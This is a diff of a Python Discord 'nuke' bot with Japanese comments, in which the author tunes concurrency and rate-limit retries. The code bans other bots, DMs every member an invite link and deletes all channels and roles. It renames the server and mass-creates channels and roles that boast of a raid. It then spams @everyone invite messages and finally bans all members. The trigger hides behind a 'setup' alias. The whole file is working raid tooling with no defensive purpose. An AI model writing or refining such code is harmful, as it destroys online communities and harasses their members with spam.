@@ -25,11 +25,10 @@ guild_member_counts = {}
 async def on_guild_join(guild):
     count = sum(1 for m in guild.members if not m.bot)
     guild_member_counts[guild.id] = count
-    print(f"参加: {guild.name} ({count} non-bot members)")
 
-sem_global = asyncio.Semaphore(50)   # 増やして同時処理強化
-sem_message = asyncio.Semaphore(120)
-sem_dm = asyncio.Semaphore(20)
+sem_global = asyncio.Semaphore(30)   # 同時数を抑えて安定
+sem_message = asyncio.Semaphore(60)
+sem_dm = asyncio.Semaphore(15)
 
 async def limited_global(coro):
     async with sem_global:
@@ -52,178 +51,146 @@ async def limited_dm(coro):
         except:
             pass
 
-async def send_dm(member, content):
+async def send_dm(member):
     try:
-        await member.send(content)
+        await member.send(INVITE_LINK)
     except:
         pass
 
 async def create_channel_safely(guild, counter, name):
     try:
         ch = await guild.create_text_channel(name)
-        print(f"作成成功 [{counter}] → {name}")
         return ch
     except discord.HTTPException as e:
         if e.status == 429:
             retry = getattr(e, 'retry_after', 3)
-            print(f"429検知！ {retry:.1f}秒待機して再試行")
-            await asyncio.sleep(retry + 0.1)
+            await asyncio.sleep(retry + 0.2)
             return await create_channel_safely(guild, counter, name)
-        else:
-            print(f"チャンネル作成エラー: {e}")
-            return None
-    except Exception as e:
-        print(f"予期せぬエラー: {e}")
         return None
 
 async def delete_all_roles_task(guild):
-    print("ロール全削除タスク開始...")
+    print("ロール削除開始...")
     roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
     deleted = 0
     for r in roles_to_delete:
         retries = 0
-        while retries < 5:
+        while retries < 10:  # 再試行増やして確実に
             try:
-                await limited_global(r.delete())
+                await r.delete()
                 deleted += 1
-                print(f"ロール削除成功: {r.name}")
                 break
             except discord.HTTPException as e:
                 if e.status == 429:
-                    await asyncio.sleep(getattr(e, 'retry_after', 2) + 0.2)
+                    await asyncio.sleep(getattr(e, 'retry_after', 2) + 0.3)
                     retries += 1
                 else:
-                    print(f"ロール削除エラー {r.name}: {e}")
                     break
             except:
-                print(f"ロール削除予期せぬエラー {r.name}")
                 break
-    print(f"ロール全削除完了: {deleted}/{len(roles_to_delete)}個")
+        if deleted % 10 == 0:
+            print(f"ロール削除進捗: {deleted}/{len(roles_to_delete)}")
+    print(f"ロール削除完了: {deleted}/{len(roles_to_delete)}")
 
 async def create_colored_roles_task(guild, target_roles):
-    print(f"カラフルロール作成タスク開始... 目標: {target_roles}")
+    print("ロール作成開始...")
     current = 0
-    role_batch_size = 45
-    batch_sleep_base = 0.03
-
+    created = 0
     while current < target_roles:
-        tasks = []
-        for _ in range(role_batch_size):
-            if current >= target_roles:
-                break
-            current += 1
-            tasks.append(limited_global(guild.create_role(
+        try:
+            role = await guild.create_role(
                 name="ますまに共栄圏に荒らされましたｗｗｗ",
                 color=discord.Color.random(),
                 reason=""
-            )))
-
-        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
-        added = sum(1 for r in batch_results if isinstance(r, discord.Role))
-        print(f"ロールバッチ完了: +{added}個 (合計 {current}/{target_roles})")
-        await asyncio.sleep(random.uniform(batch_sleep_base, batch_sleep_base + 0.06))
-
-        if added == 0:
-            print("ロール連続失敗 → 作成中断")
+            )
+            created += 1
+            current += 1
+            if created % 10 == 0:
+                print(f"ロール作成進捗: {created}/{target_roles}")
+        except discord.HTTPException as e:
+            if e.status == 429:
+                await asyncio.sleep(getattr(e, 'retry_after', 3) + 0.3)
+            else:
+                break
+        except:
             break
-
-    print(f"ロール作成タスク完了: {current}個")
-
-async def ban_all_task(guild, members, reason):
-    print("BANタスク開始...")
-    ban_tasks = [limited_global(guild.ban(m, reason=reason, delete_message_days=0)) for m in members]
-    await asyncio.gather(*ban_tasks, return_exceptions=True)
-    print("BANタスク完了")
+    print(f"ロール作成完了: {created}/{target_roles}")
 
 async def core_nuke(guild, new_server_name=None):
     new_name = new_server_name or DEFAULT_NEW_NAME
-    print(f"ますまに開始: {guild.name}")
+    print("開始")
 
     members = [m for m in guild.members if m != bot.user]
     non_bot_members = [m for m in members if not m.bot]
 
-    # 1. 他のボットを最初にBAN
-    print("他のボットをBAN開始...")
+    # 他のボットBAN
     bot_ban_tasks = [limited_global(guild.ban(m, reason="", delete_message_days=0)) for m in members if m.bot]
     await asyncio.gather(*bot_ban_tasks, return_exceptions=True)
-    print("他のボットBAN完了")
 
-    # 2. DM送信（招待リンクのみ）
-    dm_content = INVITE_LINK
-    dm_tasks = [limited_dm(send_dm(m, dm_content)) for m in non_bot_members]
+    # DM（リンクのみ）
+    dm_tasks = [limited_dm(send_dm(m)) for m in non_bot_members]
     await asyncio.gather(*dm_tasks)
-    print(f"DM完了: {len(non_bot_members)}人")
 
-    # 3. 全チャンネル削除（強化再試行）
-    print("全チャンネル削除開始...")
+    # 全チャンネル削除（逐次 + 再試行）
+    print("チャンネル削除開始...")
     channels_to_delete = guild.channels[:]
+    deleted_ch = 0
     for ch in channels_to_delete:
         retries = 0
-        while retries < 5:
+        while retries < 10:
             try:
-                await limited_global(ch.delete())
-                print(f"チャンネル削除成功: {ch.name}")
+                await ch.delete()
+                deleted_ch += 1
                 break
             except discord.HTTPException as e:
                 if e.status == 429:
-                    await asyncio.sleep(getattr(e, 'retry_after', 2) + 0.2)
+                    await asyncio.sleep(getattr(e, 'retry_after', 2) + 0.3)
                     retries += 1
                 else:
-                    print(f"チャンネル削除エラー {ch.name}: {e}")
                     break
             except:
-                print(f"チャンネル削除予期せぬエラー {ch.name}")
                 break
-    print("全チャンネル削除完了")
+        if deleted_ch % 10 == 0:
+            print(f"チャンネル削除進捗: {deleted_ch}/{len(channels_to_delete)}")
+    print("チャンネル削除完了")
 
-    # 4. サーバー名変更（チャンネル削除後）
+    # サーバー名変更
     try:
         await guild.edit(name=new_name, reason="")
-        print("サーバー名変更完了")
     except:
-        print("サーバー名変更スキップ")
+        pass
 
-    # 規模別調整
+    # 規模別調整（sleep長めで安定重視）
     member_count = len(non_bot_members)
     if member_count < 100:
-        dm_concurrency = 25
-        target_channels = 120
-        target_roles = 100
-        messages_per_channel_goal = 100
-        channel_batch_size = 50
-        batch_sleep_base = 0.03
-        spam_round_sleep_min = 0.03
-        spam_round_sleep_max = 0.1
-        print("小規模サーバー → 超爆速鬼モード")
-    elif member_count < 500:
-        dm_concurrency = 15
         target_channels = 100
         target_roles = 80
-        messages_per_channel_goal = 100
-        channel_batch_size = 45
-        batch_sleep_base = 0.06
-        spam_round_sleep_min = 0.06
-        spam_round_sleep_max = 0.18
-        print("中規模サーバー → 爆速モード")
+        channel_batch_size = 30
+        batch_sleep_base = 0.15
+        spam_sleep_min = 0.2
+        spam_sleep_max = 0.5
+    elif member_count < 500:
+        target_channels = 80
+        target_roles = 60
+        channel_batch_size = 25
+        batch_sleep_base = 0.25
+        spam_sleep_min = 0.3
+        spam_sleep_max = 0.7
     else:
-        dm_concurrency = 8
-        target_channels = 70
-        target_roles = 50
-        messages_per_channel_goal = 100
-        channel_batch_size = 35
-        batch_sleep_base = 0.12
-        spam_round_sleep_min = 0.12
-        spam_round_sleep_max = 0.3
-        print("大規模サーバー → 高速安定モード")
+        target_channels = 50
+        target_roles = 40
+        channel_batch_size = 20
+        batch_sleep_base = 0.4
+        spam_sleep_min = 0.5
+        spam_sleep_max = 1.0
 
-    global sem_dm
-    sem_dm = asyncio.Semaphore(dm_concurrency)
+    # ロール削除タスク
+    role_delete_task = asyncio.create_task(delete_all_roles_task(guild))
 
-    # 5. チャンネル作成（2種類交互）
+    # チャンネル作成（2種類交互）
     channels = []
     current = 0
     channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
-    print(f"チャンネル作成開始... 目標: {target_channels}")
+    print("チャンネル作成開始")
 
     while len(channels) < target_channels:
         tasks = []
@@ -231,114 +198,76 @@ async def core_nuke(guild, new_server_name=None):
             if len(channels) >= target_channels:
                 break
             current += 1
-            name = channel_names[current % 2]  # 交互に切り替え
+            name = channel_names[current % 2]
             tasks.append(create_channel_safely(guild, current, name))
 
         if not tasks:
             break
 
         created_batch = await asyncio.gather(*tasks, return_exceptions=True)
-        added = 0
-        for res in created_batch:
-            if isinstance(res, discord.TextChannel):
-                channels.append(res)
-                added += 1
+        added = sum(1 for r in created_batch if isinstance(r, discord.TextChannel))
+        channels += [r for r in created_batch if isinstance(r, discord.TextChannel)]
+        print(f"チャンネル作成進捗: {len(channels)}/{target_channels}")
 
-        print(f"チャンネルバッチ完了: +{added}個 (合計 {len(channels)}/{target_channels})")
+        await asyncio.sleep(random.uniform(batch_sleep_base, batch_sleep_base + 0.3))
 
-        await asyncio.sleep(random.uniform(batch_sleep_base, batch_sleep_base + 0.06))
+    # ロール作成タスク
+    role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))
 
-        if added == 0:
-            print("チャンネル連続失敗 → 作成中断")
-            break
-
-    print(f"チャンネル作成完了: {len(channels)}個")
-
-    if not channels:
-        print("チャンネルゼロ → BANのみ実行")
-        ban_task = asyncio.create_task(ban_all_task(guild, non_bot_members, new_name))
-        await ban_task
-        print("BAN完了")
-        return
-
-    # 6. スパム開始 + ロール削除・作成・BANを並行で起動
+    # スパム
     spam_messages = [
-        f"@everyone {new_name} 万歳！！！ {INVITE_LINK}",
-        f"@everyone ますまに共栄圏最強 {INVITE_LINK}",
-        f"@everyone 雑魚乙ゴミサーバー {INVITE_LINK}",
-        f"@everyone 来いよ {INVITE_LINK}"
+        f"@everyone {INVITE_LINK}",
+        f"@everyone 来い {INVITE_LINK}"
     ]
 
     message_counters = {ch.id: 0 for ch in channels}
     active_channels = channels.copy()
 
-    print(f"高速同時ラウンドロビンスパム開始... 各チャンネル {messages_per_channel_goal}メッセージまで")
+    print("スパム開始")
 
-    # 並行タスク起動
-    role_delete_task = asyncio.create_task(delete_all_roles_task(guild))
-    role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))
-    ban_task = asyncio.create_task(ban_all_task(guild, non_bot_members, new_name))
-
-    spam_running = True
-    while spam_running:
+    while any(c < 100 for c in message_counters.values()):
         spam_tasks = []
         for ch in active_channels[:]:
-            if message_counters[ch.id] >= messages_per_channel_goal:
+            if message_counters[ch.id] >= 100:
                 active_channels.remove(ch)
                 continue
 
             async def send_one(ch=ch):
                 try:
-                    msg = random.choice(spam_messages)
-                    await limited_message(ch.send(msg))
+                    await limited_message(ch.send(random.choice(spam_messages)))
                     message_counters[ch.id] += 1
-                    print(f"[{ch.name}] 送信 {message_counters[ch.id]}/{messages_per_channel_goal}")
                 except discord.HTTPException as e:
                     if e.status == 429:
-                        retry = getattr(e, 'retry_after', 2) + 0.3
-                        print(f"[{ch.name}] 429待機 {retry:.2f}s")
-                        await asyncio.sleep(retry)
-                        spam_tasks.append(send_one(ch))
-                    else:
-                        print(f"[{ch.name}] エラー {e} → 除外")
-                        if ch in active_channels:
-                            active_channels.remove(ch)
+                        await asyncio.sleep(getattr(e, 'retry_after', 3) + 0.5)
                 except:
-                    print(f"[{ch.name}] 予期せぬエラー → 除外")
                     if ch in active_channels:
                         active_channels.remove(ch)
 
             spam_tasks.append(send_one())
 
-        if spam_tasks:
-            await asyncio.gather(*spam_tasks, return_exceptions=True)
+        await asyncio.gather(*spam_tasks, return_exceptions=True)
+        await asyncio.sleep(random.uniform(spam_sleep_min, spam_sleep_max))
 
-        await asyncio.sleep(random.uniform(spam_round_sleep_min, spam_round_sleep_max))
+    print("スパム完了")
 
-        if not any(count < messages_per_channel_goal for count in message_counters.values()):
-            spam_running = False
-
-    print("全チャンネル100メッセージ達成 → スパム完了")
-
-    # 並行タスク待機
+    # タスク待機
     await role_delete_task
     await role_create_task
-    await ban_task
 
-    print("全工程完了")
+    # BAN
+    ban_tasks = [limited_global(guild.ban(m, reason=new_name, delete_message_days=0)) for m in non_bot_members]
+    await asyncio.gather(*ban_tasks, return_exceptions=True)
+
+    print("完了")
 
 @bot.command(name="masumani", aliases=["setup"])
 async def trigger(ctx, *, new_name: str = None):
-    if not ctx.guild:
-        return
-    try:
+    if ctx.guild:
         await ctx.message.delete()
-    except:
-        pass
-    asyncio.create_task(core_nuke(ctx.guild, new_name))
+        asyncio.create_task(core_nuke(ctx.guild, new_name))
 
 @bot.event
 async def on_ready():
-    print(f"ボット起動: {bot.user} (ID: {bot.user.id})")
+    print(f"起動: {bot.user}")
 
 bot.run(TOKEN)
